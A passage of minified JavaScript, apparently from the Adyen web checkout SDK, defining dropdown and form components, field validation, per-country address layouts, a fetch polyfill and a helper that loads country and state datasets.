0===c?"":c,d=e.showOnError,p=void 0!==d&&d,h=Fc(!1),f=h[0],A=h[1],m=Dc(null),v=function(){A(!0)},g=Cc.apply(void 0,bl([[i],"adyen-checkout__image",{"adyen-checkout__image--loaded":f}],o.map((function(e){return"adyen-checkout__image--"+e}))));return Oc((function(){var e=n?new Image:m.current;e.src=n||l,e.onload=v,A(!!e.complete)}),[]),n?Hl("div",ml({style:{backgroundUrl:n}},e,{className:g})):Hl("img",ml({},e,{alt:u,ref:m,className:g,onError:function(){A(p)}}))}function Bu(e){var t=e.filterable,n=e.toggleButtonRef,r=vl(e,["filterable","toggleButtonRef"]);return Hl(t?"div":"button",ml({},r,{ref:n}))}function Eu(e){var t,n=Xc().i18n,r=e.active,i=e.readonly,a=e.showList;return Hl(Bu,{"aria-disabled":i,"aria-expanded":a,"aria-haspopup":"listbox",className:Cc((t={"adyen-checkout__dropdown__button":!0},t["Select-module_adyen-checkout__dropdown__button__waz0I"]=!0,t["adyen-checkout__dropdown__button--readonly"]=i,t["adyen-checkout__dropdown__button--active"]=a,t["Select-module_adyen-checkout__dropdown__button--active__1EqeU"]=a,t["adyen-checkout__dropdown__button--invalid"]=e.isInvalid,t)),filterable:e.filterable,onClick:i?null:e.toggleList,onKeyDown:i?null:e.onButtonKeyDown,role:e.filterable?"button":null,tabIndex:"0",title:r.name||e.placeholder,toggleButtonRef:e.toggleButtonRef,type:e.filterable?null:"button"},a&&e.filterable?Hl("input",{"aria-autocomplete":"list","aria-controls":e.selectListId,"aria-expanded":a,"aria-owns":e.selectListId,autoComplete:"off",className:Cc("adyen-checkout__filter-input",["Select-module_adyen-checkout__filter-input__HMjy5"]),onInput:e.onInput,placeholder:n.get("select.filter.placeholder"),ref:e.filterInputRef,role:"combobox",type:"text"}):Hl(Ql,null,Hl("span",{className:"adyen-checkout__dropdown__button__text"},r.selectedOptionName||r.name||e.placeholder),r.icon&&Hl(Mu,{className:"adyen-checkout__dropdown__button__icon",src:r.icon,alt:r.name})))}var Tu=function(e){var t=e.item,n=e.selected,r=vl(e,["item","selected"]);return Hl("li",{"aria-disabled":!!t.disabled,"aria-selected":n,className:Cc(["adyen-checkout__dropdown__element","Select-module_adyen-checkout__dropdown__element__3nIQR",{"adyen-checkout__dropdown__element--active":n,"adyen-checkout__dropdown__element--disabled":!!t.disabled}]),"data-disabled":!!t.disabled,"data-value":t.id,onClick:r.onSelect,onKeyDown:r.onKeyDown,role:"option",tabIndex:-1},Hl("span",null,t.name),t.icon&&Hl(Mu,{className:"adyen-checkout__dropdown__element__icon",alt:t.name,src:t.icon}))};function Pu(e){var t,n=e.active,r=e.items,i=e.showList,a=e.textFilter,o=vl(e,["active","items","showList","textFilter"]),s=Xc().i18n,l=r.filter((function(e){return!a||e.name.toLowerCase().includes(a)}));return Hl("ul",{className:Cc((t={test:!0,"adyen-checkout__dropdown__list":!0},t["Select-module_adyen-checkout__dropdown__list__2UxAp"]=!0,t["adyen-checkout__dropdown__list--active"]=i,t["Select-module_adyen-checkout__dropdown__list--active__Mlt8t"]=i,t)),id:o.selectListId,ref:o.selectListRef,role:"listbox"},l.length?l.map((function(e){return Hl(Tu,{item:e,key:e.id,onKeyDown:o.onKeyDown,onSelect:o.onSelect,selected:e.id===n.id})})):Hl("div",{className:"adyen-checkout__dropdown__element adyen-checkout__dropdown__element--no-options"},s.get("select.noOptionsFound")))}var Iu={arrowDown:"ArrowDown",arrowUp:"ArrowUp",enter:"Enter",escape:"Escape",space:" "};function Fu(e){var t=Dc(null),n=Dc(null),r=Dc(null),i=Dc(null),a=Fc(null),o=a[0],s=a[1],l=Fc(!1),c=l[0],u=l[1],d=Rc((function(){return"select-"+hc()}),[]),p=e.items.find((function(t){return t.id===e.selected}))||{},h=function(e){n.current.contains(e.target)||u(!1)},f=function(t){t.preventDefault();var n=i.current.contains(t.currentTarget)?t.currentTarget:i.current.firstElementChild;if(!n.getAttribute("data-disabled")){s(null),u(!1),r.current&&r.current.focus();var a=n.getAttribute("data-value");e.onChange({target:{value:a,name:e.name}})}};return Oc((function(){c&&e.filterable&&t.current&&t.current.focus()}),[c]),Oc((function(){return document.addEventListener("click",h,!1),function(){document.removeEventListener("click",h,!1)}}),[]),Hl("div",{className:Cc(bl(["adyen-checkout__dropdown","Select-module_adyen-checkout__dropdown__2kGp2",e.className],e.classNameModifiers.map((function(e){return"adyen-checkout__dropdown--"+e})))),ref:n},Hl(Eu,{active:p,filterInputRef:t,filterable:e.filterable,isInvalid:e.isInvalid,onButtonKeyDown:function(t){var n;t.key===Iu.enter&&e.filterable&&c&&o?f(t):![Iu.arrowUp,Iu.arrowDown,Iu.enter].includes(t.key)&&(t.key!==Iu.space||e.filterable&&c)||(t.preventDefault(),u(!0),(null===(n=i.current)||void 0===n?void 0:n.firstElementChild)&&i.current.firstElementChild.focus())},onInput:function(e){var t=e.target.value;s(t.toLowerCase())},placeholder:e.placeholder,readonly:e.readonly,selectListId:d,showList:c,toggleButtonRef:r,toggleList:function(e){e.preventDefault(),u(!c)}}),Hl(Pu,{active:p,items:e.items,onKeyDown:function(n){var r=n.target;switch(n.key){case Iu.escape:n.preventDefault(),u(!1);break;case Iu.space:case Iu.enter:f(n);break;case Iu.arrowDown:n.preventDefault(),r.nextElementSibling&&r.nextElementSibling.focus();break;case Iu.arrowUp:n.preventDefault(),r.previousElementSibling?r.previousElementSibling.focus():e.filterable&&t.current&&t.current.focus()}},onSelect:f,selectListId:d,selectListRef:i,showList:c,textFilter:o}))}Fu.defaultProps={className:"",classNameModifiers:[],filterable:!0,items:[],readonly:!(ku.defaultProps={onChange:function(){}}),onChange:function(){}};var Lu=function(e,t){var n={boolean:ku,date:wu,emailAddress:xu,radio:Su,select:Fu,tel:Cu,text:yu,default:yu};return Hl(n[e]||n.default,ml({},t))},Ou=/^\s*[\w\-+_]+(\.[\w\-+_]+)*@[\w\-+_]+\.[\w\-+_]+(\.[\w-+_]+)*\s*$/,Nu=/^[+]*[(]{0,1}[0-9]{1,3}[)]{0,1}[-\s./0-9]*$/,Du=function(){function e(e,t,n,r){this.shouldValidate=e.modes.includes(n),this.isValid=e.validate(t,r),this.errorMessage=e.errorMessage}return e.prototype.hasError=function(){return!this.isValid&&this.shouldValidate},e}(),Ru=function(){function e(e){this.validationResults=e}return Object.defineProperty(e.prototype,"isValid",{get:function(){return this.validationResults.every((function(e){return e.isValid}))},enumerable:!1,configurable:!0}),e.prototype.hasError=function(){return Boolean(this.getError())},e.prototype.getError=function(){return this.validationResults.find((function(e){return e.hasError()}))},e.prototype.getAllErrors=function(){return this.validationResults.filter((function(e){return e.hasError()}))},e}(),ju=function(){function e(e){void 0===e&&(e={}),this.rules={shopperEmail:{validate:function(e){return Ou.test(e)},errorMessage:"error.va.gen.01",modes:["blur"]},default:{validate:function(){return!0},modes:["blur","input"]}},this.setRules(e)}return e.prototype.setRules=function(e){this.rules=ml(ml({},this.rules),e)},e.prototype.getRulesFor=function(e){var t,n=null!==(t=this.rules[e])&&void 0!==t?t:this.rules.default;return Array.isArray(n)||(n=[n]),n},e.prototype.validate=function(e,t){var n=e.key,r=e.value,i=e.mode,a=void 0===i?"blur":i,o=this.getRulesFor(n).map((function(e){return new Du(e,r,a,t)}));return new Ru(o)},e}(),Uu=function(e,t){return Object.keys(e).filter((function(e){return!t.includes(e)})).reduce((function(t,n){return t[n]=e[n],t}),{})},$u=function(e,t,n,r){return t.reduce((function(e,t){var i,a,o;return ml(ml({},e),((i={})[t]=null!==(o=null!==(a=e[t])&&void 0!==a?a:r[t])&&void 0!==o?o:n,i))}),e)};function zu(e){var t=e.schema,n=e.defaultData,r=e.processField,i=t.reduce((function(e,t){var i,a,o,s=function(e){var t;if(void 0===n[e])return{valid:!1,errors:null,data:null};var i=r({key:e,value:n[e],mode:"blur"},{state:{data:n}}),a=i[0],o=i[1];return{valid:null!==(t=o.isValid)&&void 0!==t&&t,errors:o.hasError()?o.getError():null,data:a}}(t),l=s.valid,c=s.errors,u=s.data;return{valid:ml(ml({},e.valid),(i={},i[t]=l,i)),errors:ml(ml({},e.errors),(a={},a[t]=c,a)),data:ml(ml({},e.data),(o={},o[t]=u,o))}}),{data:{},valid:{},errors:{}});return{schema:t,data:i.data,valid:i.valid,errors:i.errors}}function Hu(e){var t,n,r=e.rules,i=void 0===r?{}:r,a=e.formatters,o=void 0===a?{}:a,s=e.defaultData,l=void 0===s?{}:s,c=Rc((function(){return new ju(i)}),[]),u=function(e,t){var n=e.key,r=e.value,i=e.mode,a=o[n]?o[n](null!=r?r:""):r;return[a,c.validate({key:n,value:a,mode:i},t)]},d=Lc((n=u,function(e,t){var r,i,a,o,s,l,c,u=t.type,d=t.key,p=t.value,h=t.mode,f=t.defaultData,A=t.schema;switch(u){case"setData":return ml(ml({},e),{data:ml(ml({},e.data),(r={},r[d]=p,r))});case"setValid":return ml(ml({},e),{valid:ml(ml({},e.valid),(i={},i[d]=p,i))});case"setErrors":return ml(ml({},e),{errors:ml(ml({},e.errors),(a={},a[d]=p,a))});case"updateField":var m=n({key:d,value:p,mode:h},{state:e}),v=m[0],g=m[1];return ml(ml({},e),{data:ml(ml({},e.data),(o={},o[d]=v,o)),errors:ml(ml({},e.errors),(s={},s[d]=g.hasError()?g.getError():null,s)),valid:ml(ml({},e.valid),(l={},l[d]=null!==(c=g.isValid)&&void 0!==c&&c,l))});case"setSchema":var y=zu({schema:A,defaultData:f,processField:n}),b=e.schema.filter((function(e){return!A.includes(e)})),_=A.filter((function(t){return!e.schema.includes(t)})),w=$u(Uu(e.data,b),_,null,y.data),C=$u(Uu(e.valid,b),_,!1,y.valid),x=$u(Uu(e.errors,b),_,null,y.errors);return ml(ml({},e),{schema:A,data:w,valid:C,errors:x});case"validateForm":var S=e.schema.reduce((function(t,r){var i,a,o,s=n({key:r,value:e.data[r],mode:"blur"},{state:e})[1];return{valid:ml(ml({},t.valid),(i={},i[r]=null!==(o=s.isValid)&&void 0!==o&&o,i)),errors:ml(ml({},t.errors),(a={},a[r]=s.hasError()?s.getError():null,a))}}),{valid:e.valid,errors:e.errors});return ml(ml({},e),{valid:S.valid,errors:S.errors});default:throw new Error("Undefined useForm action")}}),{defaultData:l,schema:null!==(t=e.schema)&&void 0!==t?t:[],processField:u},zu),p=d[0],h=d[1],f=Rc((function(){return p.schema.every((function(e){return p.valid[e]}))}),[p.schema,p.valid]),A=jc((function(){h({type:"validateForm"})}),[]),m=jc((function(e,t){return h({type:"setErrors",key:e,value:t})}),[]),v=jc((function(e,t){return h({type:"setValid",key:e,value:t})}),[]),g=jc((function(e,t){return h({type:"setData",key:e,value:t})}),[]);return{handleChangeFor:function(e,t){return void 0===t&&(t="blur"),function(n){var r,i,a=(r=e,(i=n).target?"checkbox"===i.target.type?!p.data[r]:i.target.value:i);h({type:"updateField",key:e,value:a,mode:t})}},triggerValidation:A,setSchema:jc((function(e){return h({type:"setSchema",schema:e,defaultData:l})}),[p.schema]),setData:g,setValid:v,setErrors:m,isValid:f,schema:p.schema,valid:p.valid,errors:p.errors,data:p.data}}function Vu(e){var t=e.label,n=void 0===t?"":t,r=e.namePrefix,i=e.requiredFields,a=e.visibility,o=Xc().i18n,s=Hu({schema:i,rules:e.validationRules,defaultData:e.data}),l=s.handleChangeFor,c=s.triggerValidation,u=s.data,d=s.valid,p=s.errors,h=s.isValid,f=function(e){return(r?r+".":"")+e},A=function(e){return function(t){var n=t.target.name.split(r+".").pop();l(n,e)(t)}};return Oc((function(){var t,n,r,i=(n=(t=u).name,r=t.registrationNumber,ml({},(n||r)&&{company:ml(ml({},n&&{name:n}),r&&{registrationNumber:r})}));e.onChange({data:i,valid:d,errors:p,isValid:h})}),[u,d,p,h]),this.showValidation=c,"hidden"===a?null:"readOnly"===a?Hl(vu,ml({},e,{data:u})):Hl(fu,{classNameModifiers:[n],label:n},i.includes("name")&&Hl(mu,{label:o.get("companyDetails.name"),classNameModifiers:["name"],errorMessage:!!p.name},Lu("text",{name:f("name"),value:u.name,classNameModifiers:["name"],onInput:A("input"),onChange:A("blur"),spellCheck:!1})),i.includes("registrationNumber")&&Hl(mu,{label:o.get("companyDetails.registrationNumber"),classNameModifiers:["registrationNumber"],errorMessage:!!p.registrationNumber},Lu("text",{name:f("registrationNumber"),value:u.registrationNumber,classNameModifiers:["registrationNumber"],onInput:A("input"),onChange:A("blur"),spellCheck:!1})))}Vu.defaultProps={data:{},onChange:function(){},visibility:"editable",requiredFields:["name","registrationNumber"],validationRules:{default:{validate:function(e){return e&&0<e.length},modes:["blur"]}}};var Qu,Gu,Wu,Ku,qu,Xu,Yu,Ju,Zu,ed=function(e){var t=e.data,n=t.firstName,r=t.lastName,i=t.shopperEmail,a=t.telephoneNumber;return Hl(fu,{classNameModifiers:["personalDetails"],label:"personalDetails",readonly:!0},n&&n+" ",r&&r+" ",i&&Hl(Ql,null,Hl("br",null),i),a&&Hl(Ql,null,Hl("br",null),a))};function td(e){var t=e.label,n=void 0===t?"":t,r=e.namePrefix,i=e.placeholders,a=e.requiredFields,o=e.visibility,s=Xc().i18n,l=Rc(bu,[]),c=Hu({schema:a,rules:e.validationRules,defaultData:e.data}),u=c.handleChangeFor,d=c.triggerValidation,p=c.data,h=c.valid,f=c.errors,A=c.isValid,m=function(e){return function(t){var n=t.target.name.split(r+".").pop();u(n,e)(t)}},v=function(e){return(r?r+".":"")+e},g=function(e){return e&&e.errorMessage?s.get(e.errorMessage):!!e};return Oc((function(){var t,n,r,i,a,o,s,l=(n=(t=p).firstName,r=t.lastName,i=t.gender,a=t.dateOfBirth,o=t.shopperEmail,s=t.telephoneNumber,ml(ml(ml(ml({},(n||r)&&{shopperName:ml(ml(ml({},n&&{firstName:n}),r&&{lastName:r}),i&&{gender:i})}),a&&{dateOfBirth:_u(a)}),o&&{shopperEmail:o}),s&&{telephoneNumber:s}));e.onChange({data:l,valid:h,errors:f,isValid:A})}),[p,h,f,A]),this.showValidation=d,"hidden"===o?null:"readOnly"===o?Hl(ed,ml({},e,{data:p})):Hl(fu,{classNameModifiers:["personalDetails"],label:n},a.includes("firstName")&&Hl(mu,{label:s.get("firstName"),classNameModifiers:["col-50","firstName"],errorMessage:!!f.firstName},Lu("text",{name:v("firstName"),value:p.firstName,classNameModifiers:["firstName"],onInput:m("input"),onChange:m("blur"),placeholder:i.firstName,spellCheck:!1})),a.includes("lastName")&&Hl(mu,{label:s.get("lastName"),classNameModifiers:["col-50","lastName"],errorMessage:!!f.lastName},Lu("text",{name:v("lastName"),value:p.lastName,classNameModifiers:["lastName"],onInput:m("input"),onChange:m("blur"),placeholder:i.lastName,spellCheck:!1})),a.includes("gender")&&Hl(mu,{errorMessage:!!f.gender,classNameModifiers:["gender"]},Lu("radio",{i18n:s,name:v("gender"),value:p.gender,items:[{id:"MALE",name:"male"},{id:"FEMALE",name:"female"}],classNameModifiers:["gender"],onInput:m("input"),onChange:m("blur")})),a.includes("dateOfBirth")&&Hl(mu,{label:s.get("dateOfBirth"),classNameModifiers:["col-50","lastName"],errorMessage:g(f.dateOfBirth),helper:l?null:s.get("dateOfBirth.format")},Lu("date",{name:v("dateOfBirth"),value:p.dateOfBirth,classNameModifiers:["dateOfBirth"],onInput:m("input"),onChange:m("blur"),placeholder:i.dateOfBirth})),a.includes("shopperEmail")&&Hl(mu,{label:s.get("shopperEmail"),classNameModifiers:["shopperEmail"],errorMessage:g(f.shopperEmail),dir:"ltr"},Lu("emailAddress",{name:v("shopperEmail"),value:p.shopperEmail,classNameModifiers:["shopperEmail"],onInput:m("input"),onChange:m("blur"),placeholder:i.shopperEmail})),a.includes("telephoneNumber")&&Hl(mu,{label:s.get("telephoneNumber"),classNameModifiers:["telephoneNumber"],errorMessage:g(f.telephoneNumber),dir:"ltr"},Lu("tel",{name:v("telephoneNumber"),value:p.telephoneNumber,classNameModifiers:["telephoneNumber"],onInput:m("input"),onChange:m("blur"),placeholder:i.telephoneNumber})))}td.defaultProps={data:{},onChange:function(){},placeholders:{},requiredFields:["firstName","lastName","gender","dateOfBirth","shopperEmail","telephoneNumber"],validationRules:{default:{validate:function(e){return e&&0<e.length},modes:["blur"]},dateOfBirth:{validate:function(e){return function(t){if(!e)return!1;var n=_u(e),r=Date.now()-Date.parse(n);return 18<=new Date(r).getFullYear()-1970}()},errorMessage:"dateOfBirth.invalid",modes:["blur"]},telephoneNumber:{validate:function(e){return Nu.test(e)},modes:["blur"]},shopperEmail:{validate:function(e){return Ou.test(e)},modes:["blur"]}},visibility:"editable"};var nd="N/A",rd=["street","houseNumberOrName","postalCode","city","stateOrProvince","country"],id=rd[0],ad=rd[1],od=rd[2],sd=rd[3],ld=rd[4],cd=rd[5],ud={AU:{hasDataset:!0,labels:(Qu={},Qu[ad]="apartmentSuite",Qu[ld]="state",Qu[id]="address",Qu),optionalFields:[ad],placeholders:(Gu={},Gu[ld]="select.state",Gu),schema:[cd,id,ad,sd,[[ld,50],[od,50]]]},BR:{hasDataset:!0,labels:(Wu={},Wu[ld]="state",Wu),placeholders:(Ku={},Ku[ld]="select.state",Ku)},CA:{hasDataset:!0,labels:(qu={},qu[ad]="apartmentSuite",qu[ld]="provinceOrTerritory",qu[id]="address",qu),optionalFields:[ad],schema:[cd,id,ad,[[sd,70],[od,30]],ld]},GB:{labels:(Xu={},Xu[sd]="cityTown",Xu),schema:[cd,[[ad,30],[id,70]],[[sd,70],[od,30]],ld]},US:{hasDataset:!0,labels:(Yu={},Yu[od]="zipCode",Yu[ad]="apartmentSuite",Yu[ld]="state",Yu[id]="address",Yu),optionalFields:[ad],placeholders:(Ju={},Ju[ld]="select.state",Ju),schema:[cd,id,ad,sd,[[ld,50],[od,50]]]},default:{optionalFields:[],placeholders:(Zu={},Zu[ld]="select.provinceOrTerritory",Zu),schema:[cd,[[id,70],[ad,30]],[[od,30],[sd,70]],ld]}},dd=function(e){var t=e.data,n=e.label,r=t.street,i=t.houseNumberOrName,a=t.city,o=t.postalCode,s=t.stateOrProvince,l=t.country;return Hl(fu,{classNameModifiers:[n],label:n,readonly:!0},!!r&&r,i&&", "+i+",",Hl("br",null),o&&""+o,a&&", "+a,s&&s!==nd&&", "+s,l&&", "+l+" ")},pd=function(e){return{houseNumberOrName:{validate:function(t,n){var r,i,a=null===(i=null===(r=n.state)||void 0===r?void 0:r.data)||void 0===i?void 0:i.country;return a&&e.countryHasOptionalField(a,"houseNumberOrName")||0<(null==t?void 0:t.length)},modes:["blur"]},default:{validate:function(e){return 0<(null==e?void 0:e.length)},modes:["blur"]}}},hd="undefined"!=typeof globalThis&&globalThis||"undefined"!=typeof self&&self||void 0!==hd&&hd,fd="URLSearchParams"in hd,Ad="Symbol"in hd&&"iterator"in Symbol,md="FileReader"in hd&&"Blob"in hd&&function(){try{return new Blob,!0}catch(e){return!1}}(),vd="FormData"in hd,gd="ArrayBuffer"in hd;if(gd)var yd=["[object Int8Array]","[object Uint8Array]","[object Uint8ClampedArray]","[object Int16Array]","[object Uint16Array]","[object Int32Array]","[object Uint32Array]","[object Float32Array]","[object Float64Array]"],bd=ArrayBuffer.isView||function(e){return e&&-1<yd.indexOf(Object.prototype.toString.call(e))};function _d(e){if("string"!=typeof e&&(e=String(e)),/[^a-z0-9\-#$%&'*+.^_`|~!]/i.test(e)||""===e)throw new TypeError('Invalid character in header field name: "'+e+'"');return e.toLowerCase()}function wd(e){return"string"!=typeof e&&(e=String(e)),e}function Cd(e){var t={next:function(){var t=e.shift();return{done:void 0===t,value:t}}};return Ad&&(t[Symbol.iterator]=function(){return t}),t}function xd(e){this.map={},e instanceof xd?e.forEach((function(e,t){this.append(t,e)}),this):Array.isArray(e)?e.forEach((function(e){this.append(e[0],e[1])}),this):e&&Object.getOwnPropertyNames(e).forEach((function(t){this.append(t,e[t])}),this)}function Sd(e){if(e.bodyUsed)return Promise.reject(new TypeError("Already read"));e.bodyUsed=!0}function kd(e){return new Promise((function(t,n){e.onload=function(){t(e.result)},e.onerror=function(){n(e.error)}}))}function Md(e){var t=new FileReader,n=kd(t);return t.readAsArrayBuffer(e),n}function Bd(e){if(e.slice)return e.slice(0);var t=new Uint8Array(e.byteLength);return t.set(new Uint8Array(e)),t.buffer}function Ed(){return this.bodyUsed=!1,this._initBody=function(e){var t;this.bodyUsed=this.bodyUsed,(this._bodyInit=e)?"string"==typeof e?this._bodyText=e:md&&Blob.prototype.isPrototypeOf(e)?this._bodyBlob=e:vd&&FormData.prototype.isPrototypeOf(e)?this._bodyFormData=e:fd&&URLSearchParams.prototype.isPrototypeOf(e)?this._bodyText=e.toString():gd&&md&&(t=e)&&DataView.prototype.isPrototypeOf(t)?(this._bodyArrayBuffer=Bd(e.buffer),this._bodyInit=new Blob([this._bodyArrayBuffer])):gd&&(ArrayBuffer.prototype.isPrototypeOf(e)||bd(e))?this._bodyArrayBuffer=Bd(e):this._bodyText=e=Object.prototype.toString.call(e):this._bodyText="",this.headers.get("content-type")||("string"==typeof e?this.headers.set("content-type","text/plain;charset=UTF-8"):this._bodyBlob&&this._bodyBlob.type?this.headers.set("content-type",this._bodyBlob.type):fd&&URLSearchParams.prototype.isPrototypeOf(e)&&this.headers.set("content-type","application/x-www-form-urlencoded;charset=UTF-8"))},md&&(this.blob=function(){var e=Sd(this);if(e)return e;if(this._bodyBlob)return Promise.resolve(this._bodyBlob);if(this._bodyArrayBuffer)return Promise.resolve(new Blob([this._bodyArrayBuffer]));if(this._bodyFormData)throw new Error("could not read FormData body as blob");return Promise.resolve(new Blob([this._bodyText]))},this.arrayBuffer=function(){return this._bodyArrayBuffer?Sd(this)||(ArrayBuffer.isView(this._bodyArrayBuffer)?Promise.resolve(this._bodyArrayBuffer.buffer.slice(this._bodyArrayBuffer.byteOffset,this._bodyArrayBuffer.byteOffset+this._bodyArrayBuffer.byteLength)):Promise.resolve(this._bodyArrayBuffer)):this.blob().then(Md)}),this.text=function(){var e,t,n,r=Sd(this);if(r)return r;if(this._bodyBlob)return e=this._bodyBlob,n=kd(t=new FileReader),t.readAsText(e),n;if(this._bodyArrayBuffer)return Promise.resolve(function(e){for(var t=new Uint8Array(e),n=new Array(t.length),r=0;r<t.length;r++)n[r]=String.fromCharCode(t[r]);return n.join("")}(this._bodyArrayBuffer));if(this._bodyFormData)throw new Error("could not read FormData body as text");return Promise.resolve(this._bodyText)},vd&&(this.formData=function(){return this.text().then(Id)}),this.json=function(){return this.text().then(JSON.parse)},this}xd.prototype.append=function(e,t){e=_d(e),t=wd(t);var n=this.map[e];this.map[e]=n?n+", "+t:t},xd.prototype.delete=function(e){delete this.map[_d(e)]},xd.prototype.get=function(e){return e=_d(e),this.has(e)?this.map[e]:null},xd.prototype.has=function(e){return this.map.hasOwnProperty(_d(e))},xd.prototype.set=function(e,t){this.map[_d(e)]=wd(t)},xd.prototype.forEach=function(e,t){for(var n in this.map)this.map.hasOwnProperty(n)&&e.call(t,this.map[n],n,this)},xd.prototype.keys=function(){var e=[];return this.forEach((function(t,n){e.push(n)})),Cd(e)},xd.prototype.values=function(){var e=[];return this.forEach((function(t){e.push(t)})),Cd(e)},xd.prototype.entries=function(){var e=[];return this.forEach((function(t,n){e.push([n,t])})),Cd(e)},Ad&&(xd.prototype[Symbol.iterator]=xd.prototype.entries);var Td=["DELETE","GET","HEAD","OPTIONS","POST","PUT"];function Pd(e,t){if(!(this instanceof Pd))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');var n,r,i=(t=t||{}).body;if(e instanceof Pd){if(e.bodyUsed)throw new TypeError("Already read");this.url=e.url,this.credentials=e.credentials,t.headers||(this.headers=new xd(e.headers)),this.method=e.method,this.mode=e.mode,this.signal=e.signal,i||null==e._bodyInit||(i=e._bodyInit,e.bodyUsed=!0)}else this.url=String(e);if(this.credentials=t.credentials||this.credentials||"same-origin",!t.headers&&this.headers||(this.headers=new xd(t.headers)),this.method=(r=(n=t.method||this.method||"GET").toUpperCase(),-1<Td.indexOf(r)?r:n),this.mode=t.mode||this.mode||null,this.signal=t.signal||this.signal,this.referrer=null,("GET"===this.method||"HEAD"===this.method)&&i)throw new TypeError("Body not allowed for GET or HEAD requests");if(this._initBody(i),!("GET"!==this.method&&"HEAD"!==this.method||"no-store"!==t.cache&&"no-cache"!==t.cache)){var a=/([?&])_=[^&]*/;a.test(this.url)?this.url=this.url.replace(a,"$1_="+(new Date).getTime()):this.url+=(/\?/.test(this.url)?"&":"?")+"_="+(new Date).getTime()}}function Id(e){var t=new FormData;return e.trim().split("&").forEach((function(e){if(e){var n=e.split("="),r=n.shift().replace(/\+/g," "),i=n.join("=").replace(/\+/g," ");t.append(decodeURIComponent(r),decodeURIComponent(i))}})),t}function Fd(e,t){if(!(this instanceof Fd))throw new TypeError('Please use the "new" operator, this DOM object constructor cannot be called as a function.');t||(t={}),this.type="default",this.status=void 0===t.status?200:t.status,this.ok=200<=this.status&&this.status<300,this.statusText=void 0===t.statusText?"":""+t.statusText,this.headers=new xd(t.headers),this.url=t.url||"",this._initBody(e)}Pd.prototype.clone=function(){return new Pd(this,{body:this._bodyInit})},Ed.call(Pd.prototype),Ed.call(Fd.prototype),Fd.prototype.clone=function(){return new Fd(this._bodyInit,{status:this.status,statusText:this.statusText,headers:new xd(this.headers),url:this.url})},Fd.error=function(){var e=new Fd(null,{status:0,statusText:""});return e.type="error",e};var Ld=[301,302,303,307,308];Fd.redirect=function(e,t){if(-1===Ld.indexOf(t))throw new RangeError("Invalid status code");return new Fd(null,{status:t,headers:{location:e}})};var Od=hd.DOMException;try{new Od}catch(t){(Od=function(e,t){this.message=e,this.name=t;var n=Error(e);this.stack=n.stack}).prototype=Object.create(Error.prototype),Od.prototype.constructor=Od}function Nd(e,t){return new Promise((function(n,r){var i=new Pd(e,t);if(i.signal&&i.signal.aborted)return r(new Od("Aborted","AbortError"));var a=new XMLHttpRequest;function o(){a.abort()}a.onload=function(){var e,t,r={status:a.status,statusText:a.statusText,headers:(e=a.getAllResponseHeaders()||"",t=new xd,e.replace(/\r?\n[\t ]+/g," ").split("\r").map((function(e){return 0===e.indexOf("\n")?e.substr(1,e.length):e})).forEach((function(e){var n=e.split(":"),r=n.shift().trim();if(r){var i=n.join(":").trim();t.append(r,i)}})),t)};r.url="responseURL"in a?a.responseURL:r.headers.get("X-Request-URL");var i="response"in a?a.response:a.responseText;setTimeout((function(){n(new Fd(i,r))}),0)},a.onerror=function(){setTimeout((function(){r(new TypeError("Network request failed"))}),0)},a.ontimeout=function(){setTimeout((function(){r(new TypeError("Network request failed"))}),0)},a.onabort=function(){setTimeout((function(){r(new Od("Aborted","AbortError"))}),0)},a.open(i.method,function(e){try{return""===e&&hd.location.href?hd.location.href:e}catch(t){return e}}(i.url),!0),"include"===i.credentials?a.withCredentials=!0:"omit"===i.credentials&&(a.withCredentials=!1),"responseType"in a&&(md?a.responseType="blob":gd&&i.headers.get("Content-Type")&&-1!==i.headers.get("Content-Type").indexOf("application/octet-stream")&&(a.responseType="arraybuffer")),!t||"object"!=_typeof2(t.headers)||t.headers instanceof xd?i.headers.forEach((function(e,t){a.setRequestHeader(t,e)})):Object.getOwnPropertyNames(t.headers).forEach((function(e){a.setRequestHeader(e,wd(t.headers[e]))})),i.signal&&(i.signal.addEventListener("abort",o),a.onreadystatechange=function(){4===a.readyState&&i.signal.removeEventListener("abort",o)}),a.send(void 0===i._bodyInit?null:i._bodyInit)}))}Nd.polyfill=!0,hd.fetch||(hd.fetch=Nd,hd.Headers=xd,hd.Request=Pd,hd.Response=Fd);var Dd="fetch"in window?window.fetch:Nd;function Rd(e,t){var n=e.headers,r=void 0===n?[]:n,i=e.errorLevel,a=void 0===i?"warn":i,o=e.loadingContext,s=void 0===o?mc:o,l=e.method,c=void 0===l?"GET":l,u=e.path,d=ml({method:c,mode:"cors",cache:"default",credentials:"same-origin",headers:ml({Accept:"application/json, text/plain, */*","Content-Type":"POST"===c?"application/json":"text/plain"},r),redirect:"follow",referrerPolicy:"no-referrer-when-downgrade"},t&&{body:JSON.stringify(t)}),p=""+s+u;return Dd(p,d).then((function(t){return t.ok?t.json():jd(e.errorMessage||"Service at "+p+" is not available",a)})).catch((function(t){return jd(e.errorMessage||"Call to "+p+" failed. Error= "+t,a)}))}function jd(e,t){switch(t){case"silent":return null;case"info":case"warn":case"error":return;default:throw new Error(e)}}var Ud=function(e,t){return Rd(ml(ml({},e),{method:"POST"}),t)};function $d(e,t,n){return Rd(ml(ml({},{loadingContext:t,errorLevel:"warn",errorMessage:"Dataset "+e+" is not available",path:"datasets/"+e+"/"+n+".json"}),{method:"GET"}),void 0)}function zd(e){var t=e.classNameModifiers,n=e.label,r=e.onDropdownChange,i=e.readOnly,a=e.selectedCountry,o=e.specifications,s=e.value,l=Xc(),c=l.i18n,u=l.loadingContext,d=Fc([]),p=d[0],h=d[1],f=Fc(!1),A=f[0],m=f[1],v=o.getPlaceholderKeyForField("stateOrProvince",a);return Nc((function(){if(!a||!o.countryHasDataset(a))return h([]),void m(!0);$d("states/"+a,u,c.locale).then((function(e){var t=e&&e.length?e:[];h(t),m(!0)})).catch((function(){h([]),m(!0)}))}),[a]),A&&p.length?Hl(mu,{label:n,classNameModifiers:t,errorMessage:e.errorMessage},Lu("select",{name:"stateOrProvince",onChange:r,selected:s,placeholder:c.get(v),items:p,readonly:i&&!!s})):null}function Hd(e){var t=e.allowedCountries,n=void 0===t?[]:t,r=e.classNameModifiers,i=void 0===r?[]:r,a=e.errorMessage,o=e.onDropdownChange,s=e.value,l=Xc(),c=l.i18n,u=l.loadingContext,d=Fc([]),p=d[0],h=d[1],f=Fc(!1),A=f[0],m=f[1],v=Fc(e.readOnly),g=v[0],y=v[1];return Nc((function(){$d("countries",u,c.locale).then((function(e){var t=n.length?e.filter((function(e){return 